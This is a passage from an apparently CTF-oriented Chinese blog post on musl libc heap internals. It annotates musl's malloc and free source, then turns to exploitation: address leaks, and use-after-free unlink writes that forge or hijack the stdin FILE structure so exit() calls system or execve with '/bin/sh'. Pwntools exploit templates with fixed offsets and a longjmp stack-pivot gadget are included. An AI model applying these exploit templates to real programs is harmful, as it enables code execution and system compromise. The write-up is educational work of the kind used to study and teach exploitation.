NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">	next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将多余的chunk释放到 bin</span></span><br><span class="line">	__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-free"   >
          <a href="#2-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free" class="headerlink" title="(2)free"></a>(2)free</h3>
      <p>这个比较简单，如果csize没有设置标志位，就有两种可能，要么是double free，要么是mmap出来的chunk。所以进入unmap_chunk函数仔细判断，否则就是设置了标志位，正常进入__bin_chunk函数进行释放。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">	<span class="comment">//判断csize是否设置了标志位</span></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);<span class="comment">//检测psize字段</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);<span class="comment">//正常释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="①unmap-chunk"   >
          <a href="#①unmap-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#①unmap-chunk" class="headerlink" title="①unmap_chunk"></a>①unmap_chunk</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">	<span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">	<span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">	<span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="comment">//如果psize字段设置inuse位，直接crash</span></span><br><span class="line">	<span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    <span class="comment">//否则作为mmap chunk进入释放函数</span></span><br><span class="line">	__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②-bin-chunk"   >
          <a href="#②-bin-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#②-bin-chunk" class="headerlink" title="②__bin_chunk"></a>②__bin_chunk</h4>
      <p>正常的释放函数，首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">   	<span class="comment">//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">//相当于检测pre_size和size</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//检测该chunk的前后是否处于空闲状态</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//对于上一个chunk，检测当前chunk的psize位</span></span><br><span class="line">        <span class="comment">//对于下一个chunk，检测下一个chunk的csize位</span></span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">//前后处于use状态，那么对当前chunk进行释放即可</span></span><br><span class="line">            <span class="comment">//清除当前chunk的inuse位，下一个chunk的psize位</span></span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">            <span class="comment">//退出循环检测</span></span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向上合并空闲的chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向下合并空闲的chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置对应binmap的标志位，bins[i]</span></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将当前chunk放到bins[i]的尾部，FILO的形式</span></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> a = (<span class="keyword">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">uintptr_t</span> b = (<span class="keyword">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="keyword">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		__mmap((<span class="keyword">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-静态堆内存"   >
          <a href="#4-静态堆内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-静态堆内存" class="headerlink" title="4.静态堆内存"></a>4.静态堆内存</h2>
      <p>在Libc初始化时，如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __dls3(<span class="keyword">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// ldso/dynlink.c L1839-L1840</span></span><br><span class="line">    <span class="comment">/* Donate unused parts of app and library mapping to malloc */</span></span><br><span class="line">    reclaim_gaps(&amp;app);</span><br><span class="line">    reclaim_gaps(&amp;ldso);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>会调用<code>reclaim_gaps</code>函数查找程序和 libc 库的空闲内存，通常是位于Data段上，该函数中会调用<code>__malloc_donate</code>函数将空闲内存释放到 bin中。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ldso/dynlink.c L526-L552</span></span><br><span class="line"><span class="comment">/* A huge hack: to make up for the wastefulness of shared libraries</span></span><br><span class="line"><span class="comment"> * needing at least a page of dirty memory even if they have no global</span></span><br><span class="line"><span class="comment"> * data, we reclaim the gaps at the beginning and end of writable maps</span></span><br><span class="line"><span class="comment"> * and &quot;donate&quot; them to the heap. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim</span><span class="params">(struct dso *dso, <span class="keyword">size_t</span> start, <span class="keyword">size_t</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 避开 RELRO 段</span></span><br><span class="line">    <span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line">    <span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    <span class="comment">// 使用 __malloc_donate 函数将内存释放到 bin 中</span></span><br><span class="line">    __malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reclaim_gaps</span><span class="params">(struct dso *dso)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Phdr *ph = dso-&gt;phdr;</span><br><span class="line">    <span class="keyword">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每一个段</span></span><br><span class="line">    <span class="keyword">for</span> (; phcnt--; ph=(<span class="keyword">void</span> *)((<span class="keyword">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// 条件 1：段不属于可加载段（PT_LOAD）</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 条件 2：段可读可写</span></span><br><span class="line">        <span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 在段所属的内存页中，将段前后的空闲内存传递给 reclaim 函数</span></span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">        reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">            ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>初始化结束后，在bins中会多出几个chunk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png" alt="image-20220217112724849"></p>
<p>不一定是三个chunk，多少个都有可能，主要看程序或者libc中是否存在空闲的内存。之后再进行堆内存分配时，就会在这个基础上进行分配，而非在所有bins都是空的状态进行分配。</p>

        <h2 id="5-利用方式"   >
          <a href="#5-利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-利用方式" class="headerlink" title="5.利用方式"></a>5.利用方式</h2>
      
        <h3 id="1-泄露地址"   >
          <a href="#1-泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露地址" class="headerlink" title="(1)泄露地址"></a>(1)泄露地址</h3>
      
        <h4 id="①基于静态堆内存"   >
          <a href="#①基于静态堆内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#①基于静态堆内存" class="headerlink" title="①基于静态堆内存"></a>①基于静态堆内存</h4>
      <p>那么基于静态堆内存的存在，由于最开始进行分配是在存在静态堆内存的情况下分配的，所以如果申请的chunk的size依据申请规则可以对静态堆内存进行切割，那么就会进行切割，由于是切割的chunk，那么此时返回的chunk的就会自然而然带上地址。</p>
<p>同样的，当碰上静态堆内存初始化之后，在一个bins中同时存在程序中的chunk和libc中的chunk时，我们将该chunk切割或者申请出来，就可以同时泄露Libc地址和程序ELF地址了。</p>

        <h4 id="②基于bins"   >
          <a href="#②基于bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#②基于bins" class="headerlink" title="②基于bins"></a>②基于bins</h4>
      <p>前面提到，释放到bins中head指针下chunk必然会带上libc地址，那么直接申请回来就可以进行Libc地址的泄露</p>

        <h3 id="2-getshell"   >
          <a href="#2-getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="①UAF"   >
          <a href="#①UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#①UAF" class="headerlink" title="①UAF"></a>①UAF</h4>
      
        <h5 id="方法一："   >
          <a href="#方法一：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5>
      <p>这种情况可以直接通过改掉位于bin中head头部chunk的next和prev指针，然后从该bin中申请chunk，通过unbin函数中的如下操作即可进行任意地址任意写，其中的c也就是bin中的head指向的chunk。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></div></figure>

<p>相关的exp模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></div></figure>

<p>可以连续用两次也没啥问题，由于我们劫持了这个改写指针的操作，所以在相对于的bin结构中的head和tail指针并没有改变，所以仍然可以使用。</p>
<p>用两次的原因是需要在<code>stdin-&gt;prev</code>和<code>stdin-&gt;next</code>都写下一个可写地址，这样之后再从对应bin的head中申请出来时，经过unbin函数中的指针赋值操作不会出错，否则就会出现不可写或者零地址取值操作导致失败。</p>
<p>以上操作结束后就可以看到在bins[4]，也是0xa0大小对应的bin中的head指针已经被我们修改为stdin_addr-0x10，同时对应的stdin结构体的prev和next指针也是可写地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png" alt="image-20220217185755489"></p>
<p>之后从中bins[4]中申请chunk即可申请出stdin结构体，之后对应修改所需数据即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;wpos != f-&gt;wbase</span><br><span class="line">f-&gt;flag = &quot;/bin/shx00&quot;</span><br><span class="line">f-&gt;write = system</span><br><span class="line">f-&gt;lock=0</span><br></pre></td></tr></table></div></figure>

<p>相应exp模板如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(0xa0-0x20)</span><br><span class="line">edit(3,0x50+0x50,&quot;/bin/sh\x00&quot;+p64(0)*4+p64(0x1)+p64(0x0)+p64(0x2)+p64(0x0)+p64(system_addr) + \</span><br><span class="line">	p64(0x0)*8)</span><br></pre></td></tr></table></div></figure>

<p>最后调用exit()函数即可，调用链为<code>exit()-&gt;__stdio_exit_needed()(//或者是__stdio_exit)-&gt;close_file(__stdin_used)-&gt;f-&gt;write(f, 0, 0);</code>这里的f即是传入的stdin</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// src/stdio/__stdio_exit.c</span><br><span class="line">static void close_file(FILE *f)</span><br><span class="line">&#123;</span><br><span class="line">	if (!f) return;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);</span><br><span class="line">	if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __stdio_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过由于<code>FFINALLOCK(f);</code>的存在，如果进入这个函数不知道为什么会崩溃，也可能是某些设置上的问题吗？所以为了不进入这个函数，那么需要将<code>f-&gt;lock</code>置零即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png" alt="image-20220217183236401"></p>
<p>最后即可调用f-&gt;write，即劫持的system函数，rdi为stdin结构体，来getshell</p>
<p>最终小模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bins_a0h_addr = libc_base + <span class="number">0x292b28</span></span><br><span class="line">stdin_addr = libc_base + <span class="number">0x292200</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(bins_a0h_addr-<span class="number">0x10</span>)+p64(stdin_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_addr-<span class="number">0x10</span>)+p64(bins_a0h_addr-<span class="number">0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add_malloc(<span class="number">0xa0</span>-<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(system_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h5 id="方法二："   >
          <a href="#方法二：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5>
      <p>这个相对方法一就简单很多，只需要一个任意地址写即可，思路也是类似的。</p>
<p>观察上面的<code>__stdio_exit</code>函数，我们可以发现，其实它最后使用的是<code>__stdin_used</code>，而这个数据保存着stdin结构体指针，并且该数据位于libc上可读可写处，也就是说，我们可以尝试劫持<code>__stdin_used</code>下的stdin结构体指针到堆上，在堆上伪造我们的数据，从而在调用exit函数时从堆上取数据执行最终的命令。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = libc_base + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">stdin_usedpoint_addr = libc_base + <span class="number">0x292430</span></span><br><span class="line">heap_addr = <span class="number">0x555555759000</span></span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(stdin_usedpoint_addr-<span class="number">0x10</span>-<span class="number">0x8</span>)+p64(heap_addr+<span class="number">0x50</span>))</span><br><span class="line">add_malloc(<span class="number">0x1000</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>+<span class="number">0x50</span>+<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0x0</span>)+p64(execve_addr) + \</span><br><span class="line">	p64(<span class="number">0x0</span>)*<span class="number">8</span>)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>可以看到，在最后的执行命令处，rdi被成功更改为堆上的地址，并且也是对应寻找偏移找到了<code>execve</code>函数地址，更加简便了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png" alt="image-20220217193622906"></p>
<p>同时由于最后调用的<code>f-&gt;write(f,0,0)</code>，其中rsi和rdx必定为0，所以推荐还是使用execve函数，防止system函数出现非预期的一些栈环境或者其他变化，导致无法getshell。</p>

        <h5 id="方法三："   >
          <a href="#方法三：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h5>
      <p>同样的，如果是ORW，再进一步的话，是不是musl中也存在类似于setcontext之类可以甚至栈的gadget呢，其实是有的，在<code>longjmp</code>函数中，</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1.1.24的libc中</span><br><span class="line">.text:0000000000048B96                 mov     rdx, [rdi+30h]</span><br><span class="line">.text:0000000000048B9A                 mov     rsp, rdx</span><br><span class="line">.text:0000000000048B9D                 mov     rdx, [rdi+38h]</span><br><span class="line">.text:0000000000048BA1                 jmp     rdx</span><br></pre></td></tr></table></div></figure>

<p>相对应在1.2.0以上版本中也是有类似的，也在<code>longjmp</code>函数中，那么我们就可以将<code>__stdin_used</code>劫持为堆地址，在堆上布置下我们的ORW来进行攻击</p>

        <h4 id="②off-by-one"   >
          <a href="#②off-by-one" class="heading-link"><i class="fas fa-link"></i></a><a href="#②off-by-one" class="headerlink" title="②off-by-one"></a>②off-by-one</h4>
